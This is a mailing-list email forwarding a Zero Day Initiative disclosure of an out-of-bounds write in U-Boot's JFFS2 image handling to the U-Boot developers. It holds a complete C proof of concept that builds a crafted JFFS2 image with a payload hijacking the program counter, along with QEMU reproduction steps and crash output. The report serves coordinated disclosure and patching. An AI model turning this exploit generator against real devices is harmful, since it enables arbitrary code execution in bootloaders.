Return-Path: <u-boot-bounces@lists.denx.de>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from phobos.denx.de (phobos.denx.de [85.214.62.61])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 06E89C3DA49
	for <u-boot@archiver.kernel.org>; Thu, 25 Jul 2024 22:46:48 +0000 (UTC)
Received: from h2850616.stratoserver.net (localhost [IPv6:::1])
	by phobos.denx.de (Postfix) with ESMTP id 390AF883A4;
	Fri, 26 Jul 2024 00:46:47 +0200 (CEST)
Authentication-Results: phobos.denx.de; dmarc=pass (p=none dis=none) header.from=konsulko.com
Authentication-Results: phobos.denx.de; spf=pass smtp.mailfrom=u-boot-bounces@lists.denx.de
Authentication-Results: phobos.denx.de;
	dkim=pass (1024-bit key; unprotected) header.d=konsulko.com header.i=@konsulko.com header.b="Wrh92kef";
	dkim-atps=neutral
Received: by phobos.denx.de (Postfix, from userid 109)
 id 6793D883BB; Fri, 26 Jul 2024 00:46:46 +0200 (CEST)
Received: from mail-oa1-x31.google.com (mail-oa1-x31.google.com
 [IPv6:2001:4860:4864:20::31])
 (using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits))
 (No client certificate requested)
 by phobos.denx.de (Postfix) with ESMTPS id 797008692C
 for <u-boot@lists.denx.de>; Fri, 26 Jul 2024 00:46:43 +0200 (CEST)
Authentication-Results: phobos.denx.de;
 dmarc=pass (p=none dis=none) header.from=konsulko.com
Authentication-Results: phobos.denx.de;
 spf=pass smtp.mailfrom=trini@konsulko.com
Received: by mail-oa1-x31.google.com with SMTP id
 586e51a60fabf-250ca14422aso437455fac.0
 for <u-boot@lists.denx.de>; Thu, 25 Jul 2024 15:46:43 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=konsulko.com; s=google; t=1721947602; x=1722552402; darn=lists.denx.de;
 h=content-disposition:mime-version:message-id:subject:to:from:date
 :from:to:cc:subject:date:message-id:reply-to;
 bh=OXTnqK8M5t1yxZG7paWbkFWRSUukHoMQXBTbnacx+hQ=;
 b=Wrh92kefToPuckhmSdxDCVzn0VipPSSbeCDLrOySpIEHn73WQEEAmoZZYEQvY8qXMY
 g6wPfgSgFFubdbeuFryUEP+BaPmByVUdU+irfnZaeygNG9XUwneBD6XTdtRD546KJRTJ
 bbwTL+Yt/Ty66AG0QA6h31fHjKTymGJVDL2g8=
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=1e100.net; s=20230601; t=1721947602; x=1722552402;
 h=content-disposition:mime-version:message-id:subject:to:from:date
 :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
 bh=OXTnqK8M5t1yxZG7paWbkFWRSUukHoMQXBTbnacx+hQ=;
 b=IofpCzO7G96y4zDmf78e91nRxnVlKhd/nSx5dV3i1vxNsjN8Vmkh1C8U42+v4430A0
 8NVnMlR2mS4dZAoVoEaIgIrRFGnIvXIpF5uGUrgVr2+VBe1pu1EHa6oHfqf6gWelHTbS
 zCNginoYseKZzeRG3Qa42VuHpTfxVIeIJoZmBU6h+k2ixxhZIGYMuPr3n2Wi4WvG0LSL
 WAwgmeEXw6ft2iDCvUE34VGRKI7G6SQ+jvbGi+CuiLff8z39sbQuNTX4xoH6LqxQkaC8
 7g4jzbje7kNvGXIW0mHyNcKTzu7eXNgUGVFy3mVfbwkTN/rZyFmq9mY5tFcD0QmO2YVu
 rhew==
X-Gm-Message-State: AOJu0Yy23weRiCkkewZJtUGnMg0JS6RTBxvMo/Bvwb0NNOE6fWa/Iwij
 z6O2wj2wNyeLZZVYIFrJM2zoJrcCZeIJLF1elwv3p3labVzZlvRwNjKGZh7RBljSwkjj8AyuZUb
 JzdQ2Wg==
X-Google-Smtp-Source: AGHT+IGdohO13XJkkBkFV1XYuUaOAPfTZpI5CP1JvxrG7kaQVYRaoKykiX3j7kwDtQwg2mEA1AfsoA==
X-Received: by 2002:a05:6870:82a0:b0:260:e8cb:68bb with SMTP id
 586e51a60fabf-264a0cf165dmr5393881fac.17.1721947601904; 
 Thu, 25 Jul 2024 15:46:41 -0700 (PDT)
Received: from bill-the-cat (fixed-187-190-202-45.totalplay.net.
 [187.190.202.45]) by smtp.gmail.com with ESMTPSA id
 586e51a60fabf-265771e5deesm454284fac.38.2024.07.25.15.46.40
 for <u-boot@lists.denx.de>
 (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
 Thu, 25 Jul 2024 15:46:41 -0700 (PDT)
Date: Thu, 25 Jul 2024 16:46:39 -0600
From: Tom Rini <trini@konsulko.com>
To: u-boot@lists.denx.de
Subject: [zdi-disclosures@trendmicro.com: ZDI-CAN-24679: New Vulnerability
 Report]
Message-ID: <20240725224639.GE989285@bill-the-cat>
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha512;
 protocol="application/pgp-signature"; boundary="v9JJ4XFoL3Ra4iFT"
Content-Disposition: inline
X-Clacks-Overhead: GNU Terry Pratchett
X-BeenThere: u-boot@lists.denx.de
X-Mailman-Version: 2.1.39
Precedence: list
List-Id: U-Boot discussion <u-boot.lists.denx.de>
List-Unsubscribe: <https://lists.denx.de/options/u-boot>,
 <mailto:u-boot-request@lists.denx.de?subject=unsubscribe>
List-Archive: <https://lists.denx.de/pipermail/u-boot/>
List-Post: <mailto:u-boot@lists.denx.de>
List-Help: <mailto:u-boot-request@lists.denx.de?subject=help>
List-Subscribe: <https://lists.denx.de/listinfo/u-boot>,
 <mailto:u-boot-request@lists.denx.de?subject=subscribe>
Errors-To: u-boot-bounces@lists.denx.de
Sender: "U-Boot" <u-boot-bounces@lists.denx.de>
X-Virus-Scanned: clamav-milter 0.103.8 at phobos.denx.de
X-Virus-Status: Clean


--v9JJ4XFoL3Ra4iFT
Content-Type: multipart/mixed; boundary="SeBKNMHT+svZSLo1"
Content-Disposition: inline


--SeBKNMHT+svZSLo1
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable

I'm re-sending this to the list as I think I might have inadvertently
dropped it in the mailing list filters.

----- Forwarded message from "zdi-disclosures@trendmicro.com" <zdi-disclosu=
res@trendmicro.com> -----

Date: Thu, 18 Jul 2024 20:04:42 +0000
=46rom: "zdi-disclosures@trendmicro.com" <zdi-disclosures@trendmicro.com>
To: "u-boot@lists.denx.de" <u-boot@lists.denx.de>, "trini@konsulko.com" <tr=
ini@konsulko.com>
Subject: ZDI-CAN-24679: New Vulnerability Report

The attachment could not be scanned for viruses because it is a password pr=
otected file.
ZDI-CAN-24679: Das U-Boot JFFS2 Image Handling Out-Of-Bounds Write Local Pr=
ivilege Escalation Vulnerability

-- CVSS -----------------------------------------

8.2: AV:L/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H

-- ABSTRACT -------------------------------------

Trend Micro's Zero Day Initiative has identified a vulnerability affecting =
the following products:
Das U-Boot - Das U-Boot

-- VULNERABILITY DETAILS ------------------------
* Version tested: 2024.07-rc4
* Installer file: N/A
* Platform tested: QEMU

---

### Analysis

Das U-Boot versions from 2002_11_05_0120 to v2024.07-rc4 are vulnerable to =
an arbitrary code execution attack. This vulnerability exists due to an unc=
hecked memcpy function used when processing a JFFS2 filesystem image. An at=
tacker could exploit this by crafting a malicious JFFS2 image that tricks m=
emcpy into overwriting memory at an arbitrary offset with malicious code. T=
his could result in the attacker executing arbitrary code on the system or =
causing other memory corruption issues.

The parsing of JFFS2 filesystem in Das U-Boot is handled by the `jffs2_1pas=
s_read_inode()` function defined in `fs/jffs2/jffs2_1pass.c`. ( https://git=
hub.com/qemu/u-boot/blob/master/fs/jffs2/jffs2_1pass.c )

At line 777 of this file, there is a statement for memory copy:

```
ldr_memcpy(lDest, src, jNode->dsize);
```

The first two arguments for memcpy are assigned as:

At line 770: `lDest =3D (uchar *) (dest + jNode->offset);`
At line 755 and 756: `src =3D ((uchar *)jNode) + sizeof(struct jffs2_raw_in=
ode);`

As shown above, the source, destination, and size of the memcpy are control=
led by an attacker and its following content, and Das U-boot does not prope=
rly check these arguments.

Although Das U-Boot does have some checks on the content of inodes, these c=
hecks can be easily bypassed:

At line 758, it checks if `JNode->offset > totalSize`, but totalSize is ass=
igned as totalSize =3D jNode->isize at line 714. Therefore, this check can =
be bypassed by setting `JNode->isize` to 0xFFFFFFFF.

At lines 763, it also checks the CRC, but this check can be bypassed by set=
ting both `JNode->csize` and `JNode->data_crc` to 0.

### Proof of Concept

To prove the concept, we created a small program that generates a specially=
 crafted JFFS2 filesystem image. We then used QEMU to demonstrate the poten=
tial risk of this vulnerability. The Das U-Boot, when reading the specially=
 crafted filesystem image, writes content given by us to a memory location =
specified by us, causing the system to crash. We have tested this in Ubuntu=
 14.04. Follow the following instructions to set up the environment and con=
duct the PoC test.

- Install QEMU for MINI2440:

```
sudo apt-get install git git-core
cd ~
mkdir mini2440_qemu/
cd mini2440_qemu
git clone git://repo.or.cz/qemu/mini2440.git qemu
cd qemu
=2E/configure --target-list=3Darm-softmmu --prefix=3D$HOME/workspace/mini24=
40_qemu/qemu/mini2440
make
make install
export PATH=3D$HOME/workspace/mini2440_qemu/qemu/mini2440/bin:$PATH
git clone https://github.com/WeitaoZhu/mini2440-buildroot.git
cd mini2440-buildroot
make mini2440_defconfig
make menuconfig
```

- Modify Filesystem images to NAND flash with 512B Page and 16 kB erasesize

```
make -j4
cd ~
git clone https://github.com/cailiwei/flashimg
cd flashimg
=2E/autogen.sh
=2E/configure
make
cp ~/workspace/mini2440_qemu/mini2440-buildroot/output/images/u-boot.bin ~/=
flashimg
g++ poc.cpp -o poc
=2E/poc
echo -e "root\t0x4000\t0x00000000">part.txt
=2E/flashimg -s 64M -t nand -f nand.bin -p part.txt -w root,test -z 512
qemu-system-arm -M mini2440 -serial stdio -mtdblock nand.bin -usbdevice mou=
se
```

- In QEMU, type the following commands:

```
fsload
ls
go 0x32700000
```

- The output should look like the following

```
MINI2440 # fsload
### JFFS2 loading 'uImage' to 0x32000000
Scanning JFFS2 FS: . done.
load: Failed to read inode
### JFFS2 LOAD ERROR<0> for uImage!
MINI2440 # go 0x32700000
## Starting application at 0x32700000 ...
qemu: fatal: Trying to execute code outside RAM or ROM at 0x12345678

R00=3D00000001 R01=3D33d5fb70 R02=3D00000041 R03=3D00000006
R04=3D33d5fb70 R05=3D00000002 R06=3D32700000 R07=3D00000000
R08=3D33d5ffdc R09=3D00000001 R10=3D00000000 R11=3D33d5fbfd
R12=3D00000020 R13=3D33d5fb4c R14=3D33f8c4e8 R15=3D12345678
PSR=3D600001d3 -ZC- A svc32
Aborted (core dumped)
```

Note: R15 is $pc and it has been modified to 0x12345678

poc.cpp:

```c
#include <stdio.h>
#include <stdlib.h>
#include <cstdint>
#include <cstring>
#include <string.h>
#include <ctype.h>
#include <sys/stat.h>
using namespace std;
#define JFFS2_MAGIC_BITMASK  0x1985
#define JFFS2_NODE_ACCURATE  0x2000
#define JFFS2_FEATURE_INCOMPAT  0xC000
#define JFFS2_FEATURE_RWCOMPAT_DELETE  0x0000
#define JFFS2_NODETYPE_DIRENT  (JFFS2_FEATURE_INCOMPAT | JFFS2_NODE_ACCURAT=
E | 1)
#define JFFS2_NODETYPE_INODE  (JFFS2_FEATURE_INCOMPAT | JFFS2_NODE_ACCURATE=
 | 2)
#define JFFS2_NODETYPE_CLEANMARKER  (JFFS2_FEATURE_RWCOMPAT_DELETE | JFFS2_=
NODE_ACCURATE | 3)
enum
  {
    DT_UNKNOWN =3D 0,
# define DT_UNKNOWN     DT_UNKNOWN
    DT_FIFO =3D 1,
# define DT_FIFO        DT_FIFO
    DT_CHR =3D 2,
# define DT_CHR         DT_CHR
    DT_DIR =3D 4,
# define DT_DIR         DT_DIR
    DT_BLK =3D 6,
# define DT_BLK         DT_BLK
    DT_REG =3D 8,
# define DT_REG         DT_REG
    DT_LNK =3D 10,
# define DT_LNK         DT_LNK
    DT_SOCK =3D 12,
# define DT_SOCK        DT_SOCK
    DT_WHT =3D 14
# define DT_WHT         DT_WHT
  };
uint32_t crc32(unsigned char* ptr,uint32_t Size)
{

  uint32_t crcTable[256],crcTmp1;
  for (int i=3D0; i<256; i++)
   {
    crcTmp1 =3D i;
    for (int j=3D8; j>0; j--)
     {
      if (crcTmp1&1) crcTmp1 =3D (crcTmp1 >> 1) ^ 0xEDB88320L;
       else crcTmp1 >>=3D 1;
    }

     crcTable[i] =3D crcTmp1;
   }
  int32_t crcTmp2=3D 0;
  while(Size--)
  {
    crcTmp2 =3D ((crcTmp2>>8) & 0x00FFFFFF) ^ crcTable[ (crcTmp2^(*ptr)) & =
0xFF ];
    ptr++;
  }
  return (crcTmp2^0xFFFFFFFF)^0xFFFFFFFF;
}
struct Jffs2_unknown_node
{
            int16_t magic;
            int16_t nodetype;
            int32_t totlen;
            int32_t hdr_crc;
};
struct Jffs2_raw_dirent
{
            int16_t magic;
            int16_t nodetype;
            int32_t totlen;
            int32_t hdr_crc;
            int32_t pino;
            int32_t version;
            int32_t ino;
            int32_t mctime;
            int8_t nsize;
            int8_t type;
            int8_t unused[2];
            int32_t node_crc;
            int32_t name_crc;
};
struct Jffs2_raw_inode
{
            int16_t magic;
            int16_t nodetype;
            int32_t totlen;
            int32_t hdr_crc;
            int32_t ino;
            int32_t version;
            int32_t mode;
            int16_t uid;
            int16_t gid;
            int32_t isize;
            int32_t atime;
            int32_t mtime;
            int32_t ctime;
            int32_t offset;
            int32_t csize;
            int32_t dsize;
            int8_t compr;
            int8_t usercompr;
            int16_t flags;
            int32_t data_crc;
            int32_t node_crc;
};
int main(void)
{
        //PAYLOAD CONFIG
        char TARGET_FILENAME []=3D "uImage";
        uint32_t TARGET_OFFSET =3D 0x700000;
        uint32_t TARGET_LENGTH =3D 0x8;
        unsigned char PAYLOAD[]=3D "\x04\xf0\x1f\xe5\x78\x56\x34\x12"; //ld=
r $pc,0x12345678
        //
        FILE *fp =3D fopen("poc.jffs2","wb");
        uint16_t padding =3D 0xFFFF;
        Jffs2_unknown_node node;
        node.magic =3D JFFS2_MAGIC_BITMASK;
        node.nodetype =3D JFFS2_NODETYPE_CLEANMARKER;
        node.totlen =3D sizeof(node);
        node.hdr_crc =3D crc32((unsigned char*)&node,sizeof(Jffs2_unknown_n=
ode)-4);
        fwrite(&node,1,sizeof(node),fp);
        Jffs2_raw_dirent dirent;
        dirent.magic =3D JFFS2_MAGIC_BITMASK;
        dirent.nodetype =3D JFFS2_NODETYPE_DIRENT;
        dirent.totlen =3D sizeof(dirent)+strlen(TARGET_FILENAME);
        dirent.hdr_crc =3D crc32((unsigned char*)&dirent,sizeof(Jffs2_unkno=
wn_node)-4);
        dirent.pino =3D 1;
        dirent.version =3D 0;
        dirent.ino =3D 2;
        dirent.mctime =3D 0;
        dirent.nsize =3D strlen(TARGET_FILENAME);
        dirent.type =3D DT_REG;
        dirent.unused[0] =3D 0;
        dirent.unused[1] =3D 0;
        dirent.mctime =3D 0;
        dirent.node_crc =3D crc32((unsigned char*)&dirent,sizeof(Jffs2_raw_=
dirent)-8);
        dirent.name_crc =3D crc32((unsigned char*)TARGET_FILENAME,strlen(TA=
RGET_FILENAME));
        fwrite(&dirent,1,sizeof(dirent),fp);
        fwrite(TARGET_FILENAME,1,strlen(TARGET_FILENAME),fp);
        fwrite(&padding,1,sizeof(padding),fp);
        Jffs2_raw_inode inode;
        inode.magic =3D JFFS2_MAGIC_BITMASK;
        inode.nodetype =3D JFFS2_NODETYPE_INODE;
        inode.totlen =3D sizeof(inode)+sizeof(PAYLOAD)-1;
        inode.hdr_crc =3D crc32((unsigned char*)&inode,sizeof(Jffs2_unknown=
_node)-4);
        inode.ino =3D 2;
        inode.version =3D 1;
        inode.mode =3D 0x81A4;
        inode.uid =3D 0;
        inode.gid =3D 0;
        inode.isize =3D 0xFFFFFFFF; //bypass size limit
        inode.atime =3D 0;
        inode.mtime =3D 0;
        inode.ctime =3D 0;
        inode.offset =3D TARGET_OFFSET;
        inode.csize =3D 0; //bypass crc32 check
        inode.dsize =3D TARGET_LENGTH;
        inode.compr =3D 0;
        inode.usercompr =3D 0;
        inode.flags =3D 0;
        inode.data_crc =3D 0; //bypass crc32 check
        inode.node_crc =3D crc32((unsigned char*)&inode,sizeof(Jffs2_raw_in=
ode)-8);
        fwrite(&inode,1,sizeof(inode),fp);
        fwrite(&PAYLOAD,1,sizeof(PAYLOAD)-1,fp);
        fwrite(&padding,1,sizeof(padding),fp);
        fclose(fp);
        return 0;
}
```


-- CREDIT ---------------------------------------
This vulnerability was discovered by:
Aaron Luo and Spencer Hsieh of VicOne

-- FURTHER DETAILS ------------------------------

Supporting files:


If supporting files were contained with this report they are provided withi=
n a password protected ZIP file. The password is the ZDI candidate number i=
n the form: ZDI-CAN-XXXX where XXXX is the ID number.

Please confirm receipt of this report. We expect all vendors to remediate Z=
DI vulnerabilities within 120 days of the reported date. If you are ready t=
o release a patch at any point leading up to the deadline, please coordinat=
e with us so that we may release our advisory detailing the issue. If the 1=
20-day deadline is reached and no patch has been made available we will rel=
ease a limited public advisory with our own mitigations, so that the public=
 can protect themselves in the absence of a patch. Please keep us updated r=
egarding the status of this issue and feel free to contact us at any time:

Zero Day Initiative
zdi-disclosures@trendmicro.com

The PGP key used for all ZDI vendor communications is available from:

  http://www.zerodayinitiative.com/documents/disclosures-pgp-key.asc

-- INFORMATION ABOUT THE ZDI --------------------
Established by TippingPoint and acquired by Trend Micro, the Zero Day Initi=
ative (ZDI) neither re-sells vulnerability details nor exploit code. Instea=
d, upon notifying the affected product vendor, the ZDI provides its Trend M=
icro TippingPoint customers with zero day protection through its intrusion =
prevention technology. Explicit details regarding the specifics of the vuln=
erability are not exposed to any parties until an official vendor patch is =
publicly available.

Please contact us for further details or refer to:

  http://www.zerodayinitiative.com

-- DISCLOSURE POLICY ----------------------------

Our vulnerability disclosure policy is available online at:

  http://www.zerodayinitiative.com/advisories/disclosure_policy/

TREND MICRO EMAIL NOTICE

The information contained in this email and any attachments is confidential=
 and may be subject to copyright or other intellectual property protection.=
 If you are not the intended recipient, you are not authorized to use or di=
sclose this information, and we request that you notify us by reply mail or=
 telephone and delete the original message from your mail system.

For details about what personal information we collect and why, please see =
our Privacy Notice on our website at: Read privacy policy<http://www.trendm=
icro.com/privacy>



----- End forwarded message -----

--=20
Tom

--SeBKNMHT+svZSLo1
Content-Type: application/x-zip-compressed; name="ZDI-CAN-24679.zip"
Content-Description: ZDI-CAN-24679.zip
Content-Disposition: attachment; filename="ZDI-CAN-24679.zip"
Content-Transfer-Encoding: base64

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

--SeBKNMHT+svZSLo1--

--v9JJ4XFoL3Ra4iFT
Content-Type: application/pgp-signature; name="signature.asc"

-----BEGIN PGP SIGNATURE-----

iQGzBAABCgAdFiEEGjx/cOCPqxcHgJu/FHw5/5Y0tywFAmai1cQACgkQFHw5/5Y0
tyzdrQv+KQVo12SY21fIObi9kpGzS1CiWuhRhAT2gfxoIzpJEzSBtT2jXfb6cWSo
Ixun+Z6+brxGqzeEPwI3/nxtow8v7F+G5ABIJG+247lO/qmMRoTFAmHZEn608C6z
Sljybl+u/DjYKpMX0TkDiSDVU+zEijQpNAGN3qRdSuOC1h+9XaCuBbx98AbnA0WA
om0iC9bhjDEtdOUWsbNfgcTAwSNHDHcbPcvC3W8QUhNX9oCfGK6K6cmMqDLuVzD6
p316TbSLBYAU5oUm7ZwpnJmg47hXxHzUIVLtSZy0UVlTEAA9oYoBqtWYTF4EdZ25
DpBnFFlushsrhXC+JNbOC/Unp5OdN6q/STcY58YK740mUPCNWyrxpuX6LUfqxds9
vVnJr5kqmPKe4s4wkn+YK+L8MZRyhuoyFeJw+uubIyNN8TDnm9mghivMFeGlAGv9
Lhqy7OjAusbca+8h0aOOyfxA0Yd1RyPiOKrliNkupGdwBzdmI9fWkihjh0WkbY2d
5JINu9OZ
=3Ctx
-----END PGP SIGNATURE-----

--v9JJ4XFoL3Ra4iFT--
